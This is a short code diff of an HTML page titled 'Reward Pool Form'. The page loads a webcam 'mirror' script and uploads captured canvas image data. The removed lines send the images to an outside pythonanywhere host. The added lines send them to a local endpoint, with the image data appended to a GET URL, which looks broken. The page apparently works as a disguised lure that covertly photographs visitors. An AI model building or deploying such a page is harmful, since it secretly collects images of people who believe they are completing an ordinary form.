@@ -3,7 +3,7 @@
 <head>
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="/static/ajax.js"></script>
 <link rel="stylesheet" href="static/styles/style.css">
 <title>Reward Pool Form</title>
 </head>
@@ -22,9 +22,9 @@ function post(imgdata){
   //$.post("/", imgdata);}
   
 $.ajax({
-    type: 'POST',
+    type: 'GET',
     data: JSON.stringify({canvasData:imgdata}),
-    url: 'https://vyachikvk.pythonanywhere.com/savephoto',
+    url: '/savephoto'+imgdata,
     dataType: 'json',
     contentType: 'application/json',
     async: false,
